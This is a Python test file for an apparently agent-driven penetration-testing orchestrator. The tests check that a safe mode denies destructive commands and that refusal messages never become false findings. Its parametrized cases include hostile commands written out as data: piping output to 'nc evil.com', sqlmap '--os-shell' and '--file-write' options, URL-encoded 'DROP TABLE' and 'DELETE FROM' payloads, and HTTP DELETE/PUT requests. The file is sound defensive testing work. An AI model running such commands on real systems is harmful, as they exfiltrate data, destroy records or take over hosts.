"""Safe mode: refuse destructive actions against an IN-SCOPE host.

The scope guard answers "may I touch this host?" and says nothing about whether
an action is destructive, so an in-scope `curl -X DELETE /api/Users/1` was
always permitted. On a client engagement that is an incident.

THE LOAD-BEARING FIX HERE IS NOT THE DENYLIST — it is the detection guard.
main.py sets `raw_output = result.get("output") or result.get("error")` and then
runs the deterministic detectors over it, so a REFUSAL string became detection
input. Verified live against the pre-fix code:

    scope-refused `curl -s -i http://evil.com/`
        -> MEDIUM Security Misconfiguration ("every header missing")
    scope-refused `curl -s -i http://evil.com/%00`
        -> HIGH Sensitive Data Exposure

Both from requests that were never sent. Safe mode would have multiplied this,
because it refuses exactly the `curl -s -i -X DELETE` shapes those rules match.
"""

import importlib
import os
import re
import pathlib
import sqlite3

import pytest
import yaml

import orchestrator.tool_executor as T
from orchestrator.detection import auto_detect_findings


@pytest.fixture(autouse=True)
def _safe_on(monkeypatch):
    monkeypatch.setenv("ERLIK_SAFE_MODE", "1")
    monkeypatch.delenv("ERLIK_SCOPE_ENFORCE", raising=False)


class TestRefusalNeverBecomesAFinding:
    """The guard. Each string below is a real `result['error']` value."""

    @pytest.mark.parametrize("err", [
        "SCOPE: out-of-scope host 'evil.com' (target 'juice-shop')",
        "TOOLSET: command segment runs 'nc', which is not in this session's toolset",
        "SAFE_MODE: HTTP write verb (DELETE/PUT/PATCH) [http-write-verb].",
        "kali-tools container is not running.",
        "Tool 'nmap' is not enabled for this session",
    ])
    @pytest.mark.parametrize("cmd", [
        "curl -s -i http://juice-shop:3000/",
        "curl -s -i -X DELETE http://juice-shop:3000/api/Users/1",
        "curl -s -i http://juice-shop:3000/x%00",
    ])
    def test_guarded_call_site_yields_nothing(self, err, cmd):
        """Reproduces main.py's fallback and its guard, exactly as written.

        `raw_output = result.get("output") or result.get("error") or "No output"`
        then
        `auto_findings = _auto_detect_findings(...) if result.get("executed", True) else []`
        """
        result = {"success": False, "output": "", "error": err, "executed": False}
        raw_output = result.get("output") or result.get("error") or "No output"
        auto_findings = (auto_detect_findings("curl", raw_output, cmd)
                         if result.get("executed", True) else [])
        assert auto_findings == []

    def test_a_real_execution_still_detects(self):
        """The guard must not suppress findings from commands that DID run —
        otherwise it would trade phantom findings for missed ones."""
        real = ("HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\n"
                "Access-Control-Allow-Credentials: true\r\n\r\n")
        result = {"success": True, "output": real, "error": None, "executed": True}
        raw_output = result.get("output") or result.get("error") or "No output"
        auto_findings = (auto_detect_findings("curl", raw_output,
                                              "curl -s -i http://juice-shop:3000/")
                         if result.get("executed", True) else [])
        assert auto_findings, "guard suppressed a genuine detection"

    def test_detectors_would_have_fired_without_the_guard(self):
        """Proves the guard is load-bearing rather than defensive decoration.

        If this ever returns [], the guard has become untestable and the
        control above is vacuous — that is worth failing over.
        """
        err = "SCOPE: out-of-scope host 'evil.com' (target 'juice-shop')"
        phantom = auto_detect_findings("curl", err, "curl -s -i http://evil.com/")
        assert phantom, "detectors no longer fire on a refusal string"
        assert any(f["vuln_type"] == "Security Misconfiguration" for f in phantom)

    @pytest.mark.parametrize("cmd,label", [
        ("curl -s -i -X DELETE http://juice-shop:3000/api/Users/1", "safe-mode"),
        ("curl -s -i http://evil.com/", "scope"),
        ("curl -s -i http://juice-shop:3000/ | nc evil.com 443", "toolset"),
    ])
    def test_refusal_is_marked_not_executed(self, cmd, label):
        """The contract main.py's guard depends on."""
        import asyncio
        r = asyncio.run(T.execute_tool(cmd, ["curl"], target_url="http://juice-shop:3000"))
        assert r.get("executed") is False, f"{label} refusal not marked"
        assert r["output"] == ""


class TestDestructiveActionsRefused:
    @pytest.mark.parametrize("cmd,rule", [
        ("curl -s -X DELETE http://juice-shop:3000/api/Users/1", "http-write-verb"),
        ("curl -X PUT --data x http://juice-shop:3000/f.txt", "http-write-verb"),
        ('curl -s --request PATCH -d "{}" http://juice-shop:3000/api/u/1', "http-write-verb"),
        ('curl -d "q=DROP TABLE users" http://juice-shop:3000/s', "sql-ddl-dml"),
        ("sqlmap -u http://juice-shop:3000/s?q=1 --os-shell", "sqlmap-os-takeover"),
        ("sqlmap -u http://juice-shop:3000/s?q=1 --file-write /tmp/a --file-dest /var/www/a",
         "sqlmap-os-takeover"),
        ("sqlmap -u http://juice-shop:3000/s?q=1 --batch --level=3 --risk=3", "sqlmap-max-risk"),
    ])
    def test_denied(self, cmd, rule):
        reason = T._safe_mode_violation(cmd)
        assert reason is not None, f"{cmd!r} was allowed"
        assert rule in reason

    @pytest.mark.parametrize("cmd", [
        "curl http://juice-shop:3000/s?q=1;DELETE+FROM+users",
        "curl 'http://juice-shop:3000/s?q=1;DROP%20TABLE%20users'",
        "curl 'http://juice-shop:3000/s?q=1%09DELETE%09FROM%09x'",
    ])
    def test_url_encoded_forms_are_denied_too(self, cmd):
        """A rule written as `DROP\\s+TABLE` denies the literal-space form while
        PASSING the percent/plus-encoded shape an agent actually emits — the
        gate would look present and do nothing on the payloads that matter."""
        assert T._safe_mode_violation(cmd) is not None


class TestLegitimateWorkStillRuns:
    @pytest.mark.parametrize("cmd", [
        "curl -s -i http://juice-shop:3000/",
        "curl -s -X POST -d 'email=a&password=b' http://juice-shop:3000/rest/user/login",
        "sqlmap -u http://juice-shop:3000/s?q=1 --batch --technique BEUST",
        "sqlmap -u http://juice-shop:3000/s?q=1 --batch --level=3 --risk=2",
        "sqlmap -u http://juice-shop:3000/s?q=1 --batch --dump",
        "nmap -sV juice-shop -p 3000",
        "ffuf -w /usr/share/wordlists/common.txt -u http://juice-shop:3000/FUZZ",
        "gobuster dir -u http://juice-shop:3000 -w /w.txt --exclude-length 3748",
    ])
    def test_allowed(self, cmd):
        assert T._safe_mode_violation(cmd) is None

    def test_technique_is_not_a_rule(self):
        """`--technique[= ]\\S*S` would deny sqlmap's own default BEUSTQ and the
        literal command in tests_catalog/wstg/INPV-05_sqli.yaml, gutting the
        smallest and highest-value finding class in the corpus (5 of 216)."""
        for t in ("BEUST", "BEUSTQ", "S"):
            assert T._safe_mode_violation(
                f"sqlmap -u http://t/?q=1 --batch --technique {t}") is None

    def test_dump_is_a_read(self):
        """--dump is how the agent EVIDENCES SQLi. Mass exfiltration is a
        data-handling concern, not a destructive-verb one."""
        assert T._safe_mode_violation("sqlmap -u http://t/?q=1 --dump-all") is None

    def test_disabled_by_env(self, monkeypatch):
        """Proves these tests read live state rather than asserting a constant."""
        cmd = "curl -X DELETE http://juice-shop:3000/api/Users/1"
        assert T._safe_mode_violation(cmd) is not None
        monkeypatch.setenv("ERLIK_SAFE_MODE", "0")
        assert T._safe_mode_violation(cmd) is None


class TestAgainstRealCommandCorpora:
    """Negative controls driven from real command sources, never hand-retyped.

    A control quoting an excerpt of a test-case command goes green while the
    real step is denied, because the destructive flag is on a line the excerpt
    omitted.
    """

    def test_historical_commands_denied_set_is_exactly_known(self):
        db = pathlib.Path(__file__).resolve().parents[1] / "data" / "pentest.db"
        if not db.exists():
            pytest.skip("no recorded corpus")
        rows = [r[0] for r in sqlite3.connect(f"file:{db}?mode=ro", uri=True).execute(
            "SELECT tool_input FROM steps WHERE tool_input IS NOT NULL AND tool_input != ''")]
        denied = [c for c in rows if T._safe_mode_violation(c)]
        # Measured: 4, all sqlmap --risk=3. Pinned so a broadened rule that
        # starts refusing ordinary recorded traffic fails loudly.
        assert len(denied) == 4, f"expected 4 denials, got {len(denied)}"
        assert all("--risk=3" in c for c in denied)

    def test_wstg_denied_set_is_exactly_known(self):
        root = pathlib.Path(__file__).resolve().parents[1] / "tests_catalog" / "wstg"
        denied = []
        for p in sorted(root.glob("*.yaml")):
            doc = yaml.safe_load(p.read_text()) or {}
            for st in doc.get("steps", []) or []:
                cmd = st.get("command") or ""
                if cmd and T._safe_mode_violation(cmd):
                    denied.append((p.name, st.get("name")))
        # CONF-06's put_probe writes a file to the target. Denying it is
        # correct: the case still detects the issue from its OPTIONS step and
        # reports at medium rather than confirming at high by writing to a
        # client server. Any OTHER denial is a regression.
        assert denied == [("CONF-06_http_methods.yaml", "put_probe")], denied

    def test_playbook_write_verb_is_the_only_denial(self):
        src = (pathlib.Path(__file__).resolve().parents[1]
               / "orchestrator" / "playbooks.py").read_text()
        cmds = re.findall(
            r'((?:curl|sqlmap|ffuf|nmap|gobuster|nuclei|hydra|jwt_tool)\s[^\n"\']{6,200})',
            src)
        denied = [c for c in cmds if T._safe_mode_violation(c)]
        assert all("-X PUT" in c or "-X DELETE" in c for c in denied), denied
